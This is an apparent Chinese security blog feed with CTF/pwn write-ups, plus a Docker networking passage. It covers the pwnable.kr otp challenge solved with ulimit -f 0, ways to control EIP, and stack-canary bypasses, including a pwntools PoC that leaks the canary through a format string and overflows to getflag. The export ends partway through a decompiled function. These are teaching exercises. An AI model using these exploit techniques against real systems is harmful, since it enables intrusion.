<p>（2）    host模式</p>
<p>host模式下，容器不会拥有自己的网络命名空间。Docker容器中的进程处于宿主机的网络环境中，此时Docker容器和宿主机之间网络没有映射关系，外界可以通过该主机的IP地址、端口等进行Docker容器的访问。当然，除了network namespace外，其他内容宿主机是隔离的。host模式不用地址映射，可以直接使用宿主机的IP。但是也降低了隔离性，而且由于网络资源一直被竞争，所以可能造成网络的短暂不可用问题。</p>
<p>（3）    container模式</p>
<p>container模式是指新创建的容器与已有的容器共享网络信息。在此种模式下，新创建的容器与指定的容器共享IP、端口等。当然，两个容器之间除了网络信息共享外，其它内容均不可共用。由于在这种模式下，两个容器的进程使用回环网卡通信，所以通讯速率加快了。container模式的主要用于部署多个相关的应用，最好能成为一个整体。由于container模式的特点，导致了这种模式隔离性不强，可能会存在安全隐患。</p>
<p>（4）    none模式</p>
<p>none模式时，Docker拥有网络协议栈，但是没有对协议栈进行配置。这时，Docker容器的网卡以及IP，均为用户所配置。一般而言，当未给使用这种模式的容器进行网络配置时，用户无法正常使用容器进程，但是优点也很明显，它给用户最大的自由度来自定义容器的网络环境。</p>
<h3 id="1-3-Docker与传统虚拟化比较"><a href="#1-3-Docker与传统虚拟化比较" class="headerlink" title="1.3 Docker与传统虚拟化比较"></a>1.3 Docker与传统虚拟化比较</h3><p>Docker与传统的虚拟化技术有着不同，其容器是虚拟的是进程，而这些进程的依赖关系等都已经在布置容器时配置好。用户运行容器，就相当于直接利用宿主机的操作系统运行这些进程。而传统的虚拟化技术是重新虚拟一个操作系统，再在操作系统上运行这些程序进程。如图1所示，展现了Docker与传统虚拟化方式在实现上的不同。</p>
<p>​      <img src="/images/2017-09-28/1.png" alt="">                       </p>
<p>图 1 传统虚拟化技术和Docker比较</p>
<p> 从图中可知，Docker与传统的虚拟化技术最大的区别是：传统的虚拟化技术是对操作系统的虚拟化；而Docker是复用了宿主机操作系统，相当于对应用的虚拟化。</p>
<p>  当然，应用程序运行时的组合方式有很多，不局限于上面所讲到的两种。图2展示了可能的组合方式。</p>
<p> <img src="/images/2017-09-28/2.png" alt=""></p>
<p>图2 运行应用程序是可能的层次组合</p>
<p> 当然，Docker容器技术越来越受各企业的青睐，原因是它比传统的虚拟化技术有更多的优势。首先，Docker容器技术使得其不需要创建虚拟机，而创建虚拟机所耗费的时间很长，这就间接地降低了容器的启动时长，当然容器技术也让创建容器、删除容器变得迅捷；其次，Docker可以打包每个组件及其依赖，因而Docker在很大程度上解决操作系统层面的冲突依赖、缺少依赖、平台依赖等依赖问题；最后，Docker能够充分利用系统资源，因为Docker较传统的虚拟化技术省却了最耗系统资源的操作系统。</p>
<h3 id="1-4-Docker操作"><a href="#1-4-Docker操作" class="headerlink" title="1.4 Docker操作"></a>1.4 Docker操作</h3><p>Docker操作最主要的就是docker和docker daemon这两个部分，通过这两个部分，用户可以快速实现容器和镜像之间的操作。由于docke和docker daemon共用同一个二进制组件，所以docker在使用的时候一般需要root权限。</p>
<p>从docker命令使用出发，梳理出如图3所示的命令结构图。</p>
<p> <img src="/images/2017-09-28/3.png" alt=""></p>
<p>图3 Docker命令结构图</p>
<p>​       从图中可以看出，docker操作主要围绕着镜像和容器展开。通常创建可移植性的镜像，需要通过Dockerfile编写相应配置文件，然后创建之后打上标签，上传到Docker仓库中。下次需要运行时，只需要简单地将该镜像拉取至Docker宿主机上，然后运行即可。</p>
<p>​       总而言之，Docker容器技术使得应用程序的可移植性大大增强，同时还为管理人员创建应用、启动应用、更新应用提供了方便。</p>
]]></content>
      
        <categories>
            
            <category> 虚拟化 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> docker </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ulimit在pwn题中的应用]]></title>
      <url>/2017/09/27/ulimit%E5%9C%A8pwn%E9%A2%98%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/</url>
      <content type="html"><![CDATA[<h3 id="1、ulimit简介"><a href="#1、ulimit简介" class="headerlink" title="1、ulimit简介"></a>1、ulimit简介</h3><p>Linux对于每个用户，系统限制其最大进程数。为提高性能，可以根据设备资源情况，设置各linux 用户的最大进程数</p>
<p>可以用ulimit -a 来显示当前的各种用户进程限制。</p>
<p>下表是我的虚拟机各个参数的限制</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">core file size          (blocks, -c) 0</div><div class="line">data seg size           (kbytes, -d) unlimited</div><div class="line">scheduling priority             (-e) 0</div><div class="line">file size               (blocks, -f) unlimited</div><div class="line">pending signals                 (-i) 7744</div><div class="line">max locked memory       (kbytes, -l) 64</div><div class="line">max memory size         (kbytes, -m) unlimited</div><div class="line">open files                      (-n) 1024</div><div class="line">pipe size            (512 bytes, -p) 8</div><div class="line">POSIX message queues     (bytes, -q) 819200</div><div class="line">real-time priority              (-r) 0</div><div class="line">stack size              (kbytes, -s) 8192</div><div class="line">cpu time               (seconds, -t) unlimited</div><div class="line">max user processes              (-u) 7744</div><div class="line">virtual memory          (kbytes, -v) unlimited</div><div class="line">file locks                      (-x) unlimited</div></pre></td></tr></table></figure>
<h4 id="1-1-ulimit参数"><a href="#1-1-ulimit参数" class="headerlink" title="1.1 ulimit参数"></a>1.1 ulimit参数</h4><p>ulimit：显示（或设置）用户可以使用的资源的限制（limit），这限制分为软限制（当前限制）和硬限制（上限），其中硬限制是软限制的上限值，应用程序在运行过程中使用的系统资源不超过相应的软限制，任何的超越都导致进程的终止。</p>
<p>参数 描述</p>
<p>ulimited 不限制用户可以使用的资源，但本设置对可打开的最大文件数（max open files）和可同时运行的最大进程数（max user processes）无效</p>
<p>-a 列出所有当前资源极限</p>
<p>-c 设置core文件的最大值.单位:blocks</p>
<p>-d 设置一个进程的数据段的最大值.单位:kbytes</p>
<p>-f Shell 创建文件的文件大小的最大值，单位：blocks</p>
<p>-h 指定设置某个给定资源的硬极限。如果用户拥有 root 用户权限，可以增大硬极限。任何用户均可减少硬极限</p>
<p>-l 可以锁住的物理内存的最大值</p>
<p>-m 可以使用的常驻内存的最大值,单位：kbytes</p>
<p>-n 每个进程可以同时打开的最大文件数</p>
<p>-p 设置管道的最大值，单位为block，1block=512bytes</p>
<p>-s 指定堆栈的最大值：单位：kbytes</p>
<p>-S 指定为给定的资源设置软极限。软极限可增大到硬极限的值。如果 -H 和 -S 标志均未指定，极限适用于以上二者</p>
<p>-t 指定每个进程所使用的秒数,单位：seconds</p>
<p>-u 可以运行的最大并发进程数</p>
<p>-v Shell可使用的最大的虚拟内存，单位：kbytes</p>
<font color="#f00">用ulimit -s unlimited 就可以关闭aslr</font>

<h4 id="1-2-ulimit设置【临时】"><a href="#1-2-ulimit设置【临时】" class="headerlink" title="1.2 ulimit设置【临时】"></a>1.2 ulimit设置【临时】</h4><p>其他建议设置成无限制（unlimited）的一些重要设置是：</p>
<p>数据段长度：ulimit -d unlimited</p>
<p>最大内存大小：ulimit -m unlimited</p>
<p>堆栈大小：ulimit -s unlimited</p>
<p>CPU 时间：ulimit -t unlimited</p>
<p>虚拟内存：ulimit -v unlimited</p>
<p>暂时地，适用于通过 ulimit 命令登录 shell 会话期间。</p>
<h4 id="1-3-永久设置相关选项【永久】"><a href="#1-3-永久设置相关选项【永久】" class="headerlink" title="1.3 永久设置相关选项【永久】"></a>1.3 永久设置相关选项【永久】</h4><p>永久地，通过将一个相应的 ulimit 语句添加到由登录 shell 读取的文件中， 即特定于 shell 的用户资源文件，如：</p>
<ul>
<li>解除 Linux 系统的最大进程数和最大文件打开数限制：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">vi /etc/security/limits.conf</div><div class="line"># 添加如下的行</div><div class="line">* soft noproc 11000</div><div class="line">* hard noproc 11000</div><div class="line">* soft nofile 4100</div><div class="line">* hard nofile 4100</div></pre></td></tr></table></figure>
<p>​        # 添加如下的行</p>
<p>​        * soft noproc 11000</p>
<p>​        * hard noproc 11000</p>
<p>​        * soft nofile 4100</p>
<p>​        * hard nofile 4100</p>
<p>​       说明：* 代表针对所有用户，noproc 是代表最大进程数，nofile 是代表最大文件打开数</p>
<ul>
<li>让 SSH 接受 Login 程式的登入，方便在 ssh 客户端查看 ulimit -a 资源限制：</li>
</ul>
<p>​        a、vi /etc/ssh/sshd_config</p>
<p>​             把 UserLogin 的值改为 yes，并把 # 注释去掉</p>
<p>​        b、重启 sshd 服务：</p>
<p>​              /etc/init.d/sshd restart</p>
<ul>
<li><p>修改所有 linux 用户的环境变量文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">vi /etc/profile</div><div class="line">ulimit -u 10000</div><div class="line">ulimit -n 4096</div><div class="line">ulimit -d unlimited</div><div class="line">ulimit -m unlimited</div><div class="line">ulimit -s unlimited</div><div class="line">ulimit -t unlimited</div><div class="line">ulimit -v unlimited</div></pre></td></tr></table></figure>
<p>保存后运行#source /etc/profile 使其生效</p>
</li>
<li><p>解除程序能打开的文件个数限制</p>
</li>
</ul>
<p>有时候在程序里面需要打开多个文件，进行分析，系统一般默认数量是1024，（用ulimit -a可以看到）对于正常使用是够了，但是对于程序来讲，就太少了。</p>
<p>修改2个文件。</p>
<ol>
<li>/etc/security/limits.conf</li>
</ol>
<p>vi /etc/security/limits.conf</p>
<p>加上：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">* soft nofile 8192</div><div class="line">* hard nofile 20480</div></pre></td></tr></table></figure>
<ol start="2">
<li>/etc/pam.d/login</li>
</ol>
<p>session required /lib/security/pam_limits.so</p>
<p>另外确保/etc/pam.d/system-auth文件有下面内容</p>
<p>session required /lib/security/$ISA/pam_limits.so</p>
<p>这一行确保系统会执行这个限制。</p>
<ol start="3">
<li>一般用户的.bash_profile</li>
</ol>
<p>#ulimit -n 1024</p>
<p>重新登陆ok</p>
<h3 id="2、ulimit在pwn中的应用"><a href="#2、ulimit在pwn中的应用" class="headerlink" title="2、ulimit在pwn中的应用"></a>2、ulimit在pwn中的应用</h3><p>说到ulimit在pwn中的应用，这里就不得不提到pwnable.kr上的一道题otp：</p>
<p>题目描述如下</p>
<blockquote>
<p>I made a skeleton interface for one time password authentication system.<br>I guess there are no mistakes.<br>could you take a look at it?</p>
<p>hint : not a race condition. do not bruteforce.</p>
<p>ssh <a href="mailto:otp@pwnable.kr" target="_blank" rel="external">otp@pwnable.kr</a> -p2222 (pw:guest)</p>
</blockquote>
<p>该题已经给出了源码！通过源码以及既定的思维方式，一般很难找到这题的利用方法。这题的利用方式就是用ulimit设置文件size的最大值。</p>
<p>otp.c源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</div><div class="line">    <span class="keyword">char</span> fname[<span class="number">128</span>];</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> otp[<span class="number">2</span>];</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(argc!=<span class="number">2</span>)&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"usage : ./otp [passcode]\n"</span>);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/urandom"</span>, O_RDONLY);</div><div class="line">    <span class="keyword">if</span>(fd==<span class="number">-1</span>) <span class="built_in">exit</span>(<span class="number">-1</span>);</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(read(fd, otp, <span class="number">16</span>)!=<span class="number">16</span>) <span class="built_in">exit</span>(<span class="number">-1</span>);</div><div class="line">    close(fd);</div><div class="line"></div><div class="line">    <span class="built_in">sprintf</span>(fname, <span class="string">"/tmp/%llu"</span>, otp[<span class="number">0</span>]);</div><div class="line">    FILE* fp = fopen(fname, <span class="string">"w"</span>);</div><div class="line">    <span class="keyword">if</span>(fp==<span class="literal">NULL</span>)&#123; <span class="built_in">exit</span>(<span class="number">-1</span>); &#125;</div><div class="line">    fwrite(&amp;otp[<span class="number">1</span>], <span class="number">8</span>, <span class="number">1</span>, fp);</div><div class="line">    fclose(fp);</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"OTP generated.\n"</span>);</div><div class="line"></div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> passcode=<span class="number">0</span>;</div><div class="line">    FILE* fp2 = fopen(fname, <span class="string">"r"</span>);</div><div class="line">    <span class="keyword">if</span>(fp2==<span class="literal">NULL</span>)&#123; <span class="built_in">exit</span>(<span class="number">-1</span>); &#125;</div><div class="line">    fread(&amp;passcode, <span class="number">8</span>, <span class="number">1</span>, fp2);</div><div class="line">    fclose(fp2);</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(strtoul(argv[<span class="number">1</span>], <span class="number">0</span>, <span class="number">16</span>) == passcode)&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Congratz!\n"</span>);</div><div class="line">        system(<span class="string">"/bin/cat flag"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span>&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"OTP mismatch\n"</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    unlink(fname);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> subprocess</div><div class="line">subprocess.Popen([<span class="string">'/home/otp/otp'</span>, <span class="string">''</span>], stderr=subprocess.STDOUT)</div></pre></td></tr></table></figure>
<p>利用</p>
<blockquote>
<p>otp@ubuntu:~$ ulimit -f 0<br>otp@ubuntu:~$ python /tmp/otp/exp.py<br>otp@ubuntu:~$ OTP generated.<br>Congratz!<br>Darn... I always forget to check the return value of fclose() :(</p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> pwn </category>
            
        </categories>
        
        
        <tags>
            
            <tag> shell </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[控制eip的方法]]></title>
      <url>/2017/09/26/%E6%8E%A7%E5%88%B6eip%E7%9A%84%E6%96%B9%E6%B3%95/</url>
      <content type="html"><![CDATA[<p>最近做了一些pwnable上的题，得到了一些微小的结论，特意与大家分享一下。</p>
<h3 id="1、控制eip能够做什么"><a href="#1、控制eip能够做什么" class="headerlink" title="1、控制eip能够做什么"></a>1、控制eip能够做什么</h3><p>一般而言，作为pwn手小白，最希望的就是控制eip了，而控制eip究竟能做什么呢？</p>
<p>控制eip，相当于就控制了程序的执行流程，从而获得了程序的最高权限，甚至能够绕过操作系统上的安全限制，直接获取用户shell或进行破坏性操作。</p>
<p>而如果我们能够控制ctf题目中的eip，我们会进行怎样的操作呢?</p>
<ul>
<li>如果程序有shell地址，直接跳转至shell地址处，获得shell</li>
<li>如果程序没有shell，我们能够构造rop链，一步步地更改寄存器、填充栈中值。最后也是获取shell</li>
<li>如果程序NX保护没开，就可以直接跳转至栈中进行shellcode执行</li>
<li>如果某个具有可执行地址段被写入了shellcode，我们也可以跳转至此获取shell</li>
</ul>
<h3 id="2、如何控制eip"><a href="#2、如何控制eip" class="headerlink" title="2、如何控制eip"></a>2、如何控制eip</h3><h4 id="2-1-通过修改返回地址控制eip"><a href="#2-1-通过修改返回地址控制eip" class="headerlink" title="2.1 通过修改返回地址控制eip"></a>2.1 通过修改返回地址控制eip</h4><p>一般通过栈溢出的方式、堆溢出造成的任意地址写功能、程序自身逻辑造成的任意地址写等错误来修改返回地址</p>
<p>retn指令本来就是pop eip，如果能够在函数返回之前，将ret_addr替换为你想其执行的地址，就能够控制eip</p>
<p>​                0xffffffe4|       ebp      |</p>
<p>​                0xffffffe8|   ret_addr  |</p>
<h4 id="2-2-通过栈迁移的方式控制eip"><a href="#2-2-通过栈迁移的方式控制eip" class="headerlink" title="2.2 通过栈迁移的方式控制eip"></a>2.2 通过栈迁移的方式控制eip</h4><p>所谓栈迁移，就是由于程序中有ebp，进而可以在程序返回后进入上一个栈帧中。</p>
<p>如果我们能够控制ebp中的值（也即控制[\$ebp]），那么在栈帧迁移的时候（也就是在leave  ret指令执行的时候），我们就控制了[[\$ebp]+0x4]的值，而这个值实际上是上一个栈帧的返回地址。然后上一个栈帧在返回的时候，就控制了eip</p>
<p>​                0xfffffee4 |     0xffffffe4   |</p>
<p>​                0xfffffee8 |     ret_addr    |              此栈帧</p>
<p>​                            ……</p>
<p>​                0xffffffe0  |                        |            上一个栈帧</p>
<p>​                0xffffffe4  |       ebp          |            上一个栈帧的起始地址</p>
]]></content>
      
        <categories>
            
            <category> pwn </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[工具大全]]></title>
      <url>/2017/09/25/%E5%B7%A5%E5%85%B7%E5%A4%A7%E5%85%A8/</url>
      <content type="html"><![CDATA[<h4 id="shellcode脚本网站"><a href="#shellcode脚本网站" class="headerlink" title="shellcode脚本网站"></a>shellcode脚本网站</h4><p>​    <a href="http://shell-storm.org/shellcode/" target="_blank" rel="external">http://shell-storm.org/shellcode/</a></p>
<h4 id="ARM学习网站"><a href="#ARM学习网站" class="headerlink" title="ARM学习网站"></a>ARM学习网站</h4><p>​    <a href="http://www.davespace.co.uk/arm/introduction-to-arm/" target="_blank" rel="external">http://www.davespace.co.uk/arm/introduction-to-arm/</a></p>
]]></content>
      
        <categories>
            
            <category> 安全工具 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[论canary的几种玩法]]></title>
      <url>/2017/09/23/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/</url>
      <content type="html"><![CDATA[<p>此文摘抄于veritas501的博文</p>
<p><a href="http://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/" target="_blank" rel="external">http://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/</a></p>
<p>里面讨论了我所知的几种关于canary的玩法，我目前不知道的就等我以后什么时候知道了再补充吧。</p>
<hr>
<h2 id="先说说canary"><a href="#先说说canary" class="headerlink" title="先说说canary"></a>先说说canary</h2><p>canary直译就是金丝雀，为什么是叫金丝雀？</p>
<p>17世纪，英国矿井工人发现，金丝雀对瓦斯这种气体十分敏感。空气中哪怕有极其微量的瓦斯，金丝雀也会停止歌唱；而当瓦斯含量超过一定限度时，虽然鲁钝的人类毫无察觉，金丝雀却早已毒发身亡。当时在采矿设备相对简陋的条件下，工人们每次下井都会带上一只金丝雀作为“瓦斯检测指标”，以便在危险状况下紧急撤离。</p>
<p>而程序里的canary就是来检测栈溢出的。</p>
<p>检测的机制是这样的：</p>
<p>1.程序从一个神奇的地方取出一个4（eax）或8（rax）节的值，在32位程序上，你可能会看到：</p>
<p><img src="/images/2017-09-23/canary_1122569b3258873874d61fd5bfc62fba.png" alt="img"></p>
<p><img src="/images/2017-09-23/canary_32.png" alt=""></p>
<p>在64位上，你可能会看到：</p>
<p><img src="/images/2017-09-23/canary_1d676e1ed18ade8675f112f61e39ab74.png" alt="img"></p>
<p>总之，这个值你不能实现得到或预测，放到站上以后，eax中的副本也会被清空（xor eax,eax）</p>
<p>2.程序正常的走完了流程，到函数执行完的时候，程序会再次从那个神奇的地方把canary的值取出来，和之前放在栈上的canary进行比较，如果因为栈溢出什么的原因覆盖到了canary而导致canary发生了变化则直接终止程序。</p>
<p><img src="/images/2017-09-23/canary_1acfdb1810a2876c78383f4a3a66a515.png" alt="img"></p>
<p><img src="/images/2017-09-23/canary_b151b13af2155fff6a842855cbbd4d07.png" alt="img"></p>
<p>在栈中大致是这样一个画风：</p>
<p><img src="/images/2017-09-23/canary_0037817e6e24d51983d3575e02fc398d.png" alt="img"></p>
<hr>
<h2 id="绕过canary-格式化字符串"><a href="#绕过canary-格式化字符串" class="headerlink" title="绕过canary - 格式化字符串"></a>绕过canary - 格式化字符串</h2><p>格式化字符串能够实现任意地址读写，具体的实现可以参考我blog中关于格式化字符串的总结，格式化字符串的细节不是本文讨论的重点。</p>
<p>大体思路就是通过格式化字符串读取canary的值，然后在栈溢出的padding块把canary所在位置的值用正确的canary替换，从而绕过canary的检测。</p>
<p>示例程序：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">/**</div><div class="line">* compile cmd: gcc source.c -m32 -o bin</div><div class="line">**/</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line"></div><div class="line">void getflag(void) &#123;</div><div class="line">    char flag[100];</div><div class="line">    FILE *fp = fopen(&quot;./flag&quot;, &quot;r&quot;);</div><div class="line">    if (fp == NULL) &#123;</div><div class="line">        puts(&quot;get flag error&quot;);</div><div class="line">    &#125;</div><div class="line">    fgets(flag, 100, fp);</div><div class="line">    puts(flag);</div><div class="line">&#125;</div><div class="line">void init() &#123;</div><div class="line">    setbuf(stdin, NULL);</div><div class="line">    setbuf(stdout, NULL);</div><div class="line">    setbuf(stderr, NULL);</div><div class="line">&#125;</div><div class="line"></div><div class="line">void fun(void) &#123;</div><div class="line">	char buffer[100];</div><div class="line">	read(STDIN_FILENO, buffer, 120);</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(void) &#123;</div><div class="line">	char buffer[6];</div><div class="line">	init();</div><div class="line">	scanf(&quot;%6s&quot;,buffer);</div><div class="line">	printf(buffer);</div><div class="line">	fun();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在第一次scanf的时候输入“%7$x”打印出canary，在fun中利用栈溢出控制eip跳转到getflag。</p>
<p>poc:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">context.log_level = &apos;debug&apos;</div><div class="line"></div><div class="line">cn = process(&apos;./bin&apos;)</div><div class="line"></div><div class="line">cn.sendline(&apos;%7$x&apos;)</div><div class="line">canary = int(cn.recv(),16)</div><div class="line">print hex(canary)</div><div class="line"></div><div class="line">cn.send(&apos;a&apos;*100 + p32(canary) + &apos;a&apos;*12 + p32(0x0804863d))</div><div class="line"></div><div class="line">flag = cn.recv()</div><div class="line"></div><div class="line">log.success(&apos;flag is:&apos; + flag)</div></pre></td></tr></table></figure>
<hr>
<h2 id="绕过canary-针对调用方式一致"><a href="#绕过canary-针对调用方式一致" class="headerlink" title="绕过canary - 针对调用方式一致"></a>绕过canary - 针对调用方式一致</h2><p>linux下的canary有个明显的特性：<font color="#f00">那就是每个使用了canary的函数，其canary的值是完全一样的</font>。其实原理很简单，从上面给出的x86和x64的两种canary生成图示可以看出，linux的canary总是和large gs:14h或者fs:28h有关。这也就意味着，只要这个值不变，那么canary的值也不会变。显然，程序运行之后，这个地址的值不会发生改变。</p>
<p>那么，这也产生了一种攻击方法，<font color="#f00">通过存在漏洞的函数之外的函数，间接打印或者求出canary，那么这个canary可以运用到任意函数中（包括漏洞函数）。</font></p>
<p>漏洞利用样例就是pwnbale.kr中的md5 calculator那道题</p>
<p>题目描述：</p>
<blockquote>
<p>We made a simple MD5 calculator as a network service.<br>Find a bug and exploit it to get a shell.</p>
<p>Download : <a href="http://pwnable.kr/bin/hash" target="_blank" rel="external">http://pwnable.kr/bin/hash</a><br>hint : this service shares the same machine with pwnable.kr web service</p>
<p>Running at : nc pwnable.kr 9002</p>
</blockquote>
<p><a href="http://www.jianshu.com/u/97cac88b9b6e" target="_blank" rel="external">sph7</a> 已经将这个问题完美解决，这里基本上摘抄于其原文</p>
<p>ida打开文件，发现关键函数是process_hash，代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">process_hash</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> v0; <span class="comment">// ST14_4@3</span></div><div class="line">  <span class="keyword">void</span> *ptr; <span class="comment">// ST18_4@3</span></div><div class="line">  <span class="keyword">char</span> v3; <span class="comment">// [sp+1Ch] [bp-20Ch]@1</span></div><div class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+21Ch] [bp-Ch]@1</span></div><div class="line"></div><div class="line">  v4 = *MK_FP(__GS__, <span class="number">20</span>);</div><div class="line">  <span class="built_in">memset</span>(&amp;v3, <span class="number">0</span>, <span class="number">0x200</span>u);</div><div class="line">  <span class="keyword">while</span> ( getchar() != <span class="number">10</span> );</div><div class="line">  <span class="built_in">memset</span>(g_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(g_buf));</div><div class="line">  fgets(g_buf, <span class="number">1024</span>, <span class="built_in">stdin</span>);</div><div class="line">  <span class="built_in">memset</span>(&amp;v3, <span class="number">0</span>, <span class="number">0x200</span>u);</div><div class="line">  v0 = Base64Decode(g_buf, &amp;v3);</div><div class="line">  ptr = (<span class="keyword">void</span> *)calc_md5(&amp;v3, v0);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"MD5(data) : %s\n"</span>, ptr);</div><div class="line">  <span class="built_in">free</span>(ptr);</div><div class="line">  <span class="keyword">return</span> *MK_FP(__GS__, <span class="number">20</span>) ^ v4;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里的问题在与给g_buf分配了1024bytes的空间，但是只给u分配了512bytes的空间，而1024字节的base64解码之后的长度为768，所以这里有一个栈溢出。但是代码中有栈cookie，所以光靠这里是不能利用的。</p>
<p>继续看代码，发现另一个函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">my_hash</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@4</span></div><div class="line">  <span class="keyword">int</span> v1; <span class="comment">// edx@4</span></div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [sp+0h] [bp-38h]@1</span></div><div class="line"> 